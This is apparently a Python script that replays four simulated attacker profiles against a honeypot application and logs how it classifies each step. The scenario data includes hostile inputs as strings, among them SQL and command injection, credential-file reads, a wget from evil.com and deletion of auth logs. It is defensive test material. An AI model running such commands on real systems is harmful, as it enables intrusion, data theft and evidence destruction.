import json
from core.main import app

# Define different attacker profiles and their action timelines
scenarios = {
    "Dumb_Bot": {
        "ip": "203.0.113.10",
        "events": [
            {"event_type": "HTTP_GET", "details": {"payload": "/robots.txt", "method": "GET"}},
            {"event_type": "HTTP_GET", "details": {"payload": "/wp-login.php", "method": "GET"}},
            {"event_type": "HTTP_GET", "details": {"payload": "/.env", "method": "GET"}},
            {"event_type": "SSH_LOGIN_ATTEMPT", "details": {"command": "admin:admin"}},
            {"event_type": "SSH_LOGIN_ATTEMPT", "details": {"command": "root:root"}},
        ]
    },
    "Script_Kiddie": {
        "ip": "198.51.100.22",
        "events": [
            {"event_type": "HTTP_POST", "details": {"payload": "admin' OR '1'='1", "method": "POST"}},
            {"event_type": "HTTP_GET", "details": {"payload": "/etc/passwd", "method": "GET"}},
            {"event_type": "HTTP_GET", "details": {"payload": "; ls -la", "method": "GET"}},
            {"event_type": "SSH_LOGIN_ATTEMPT", "details": {"command": "hydra ssh"}},
            {"event_type": "SSH_COMMAND", "details": {"command": "wget http://evil.com/ddos_bot.sh"}},
        ]
    },
    "Persistent_Attacker": {
        "ip": "192.168.100.5",
        "events": [
            {"event_type": "HTTP_GET", "details": {"payload": "/api/v1/health", "method": "GET"}},
            {"event_type": "HTTP_GET", "details": {"payload": "/backup.zip", "method": "GET"}},
            {"event_type": "HTTP_BACKUP_ACCESS", "details": {"payload": "/backup.zip", "method": "GET"}},
            {"event_type": "SSH_KILL_CHAIN_LOGIN", "details": {"command": "admin:Adm1n#2024"}},
            {"event_type": "SSH_COMMAND", "details": {"command": "cat /home/admin/.env"}},
            {"event_type": "SSH_COMMAND", "details": {"command": "ssh deploy@prod-db-01.internal"}},
        ]
    },
    "APT_Stealth": {
        "ip": "10.10.10.99",
        "events": [
            {"event_type": "HTTP_GET", "details": {"payload": "/", "method": "GET"}},
            {"event_type": "HTTP_GET", "details": {"payload": "/about", "method": "GET"}},
            {"event_type": "SSH_LOGIN_ATTEMPT", "details": {"command": "john:password"}}, # Single probe
            {"event_type": "SSH_COMMAND", "details": {"command": "whoami"}},
            {"event_type": "SSH_COMMAND", "details": {"command": "ps aux | grep root"}},
            {"event_type": "SSH_PRIVILEGE_ESCALATION", "details": {"command": "sudo -l"}},
            {"event_type": "SSH_COMMAND", "details": {"command": "rm -rf /var/log/auth.log"}}, 
        ]
    }
}

results = {}

print("Starting Scenario Simulations...")
with app.test_client() as client:
    for profile_name, data in scenarios.items():
        print(f"\\nRunning Scenario: {profile_name}")
        profile_logs = []
        for idx, event in enumerate(data["events"]):
            event["client_ip"] = data["ip"]
            response = client.post('/event', json=event)
            json_data = response.get_json()
            
            # Record what the honeypot thought after this specific event
            log_entry = {
                "step": idx + 1,
                "payload_or_command": event['details'].get('payload') or event['details'].get('command'),
                "identified_attack": json_data.get('attack_type'),
                "current_risk_score": json_data.get('risk_score'),
                "behaviour_state": json_data.get('state_transition', {}).get('to'),
                "ai_classification": json_data.get('ai_classification'),
                "mapped_mitre": json_data.get('mitre_technique_id'),
                "action_taken": json_data.get('response', {}).get('action'),
                "kill_chain_status": json_data.get('kill_chain', {}).get('complete', False)
            }
            profile_logs.append(log_entry)
        
        # Save the final disposition for this attacker profile
        results[profile_name] = profile_logs

with open('scenario_results.json', 'w') as f:
    json.dump(results, f, indent=2)
    
print("\\nAll scenarios simulated. Results saved to scenario_results.json")
